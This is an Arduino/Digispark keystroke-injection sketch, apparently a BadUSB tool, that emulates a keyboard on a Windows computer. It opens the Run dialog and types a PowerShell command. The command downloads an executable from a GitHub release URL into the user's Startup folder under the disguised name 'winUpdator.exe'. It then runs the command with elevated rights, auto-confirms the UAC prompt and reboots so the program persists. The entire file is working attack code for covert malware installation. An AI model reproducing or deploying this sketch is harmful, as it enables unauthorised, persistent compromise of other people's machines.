/*
 * Program for digispark / arduino to load p4p1 on a computer
 */
 
#include "DigiKeyboard.h"

void setup() {
  // don't need to set anything up to use DigiKeyboard
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -c \"$a = [environment]::getfolderpath('Startup'); cd $a;  (New-Object System.Net.WebClient).DownloadFile('https://github.com/p4p1/p4p1/releases/download/V5/p4p1.exe', 'winUpdator.exe');Restart-Computer\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
}

void loop() {}
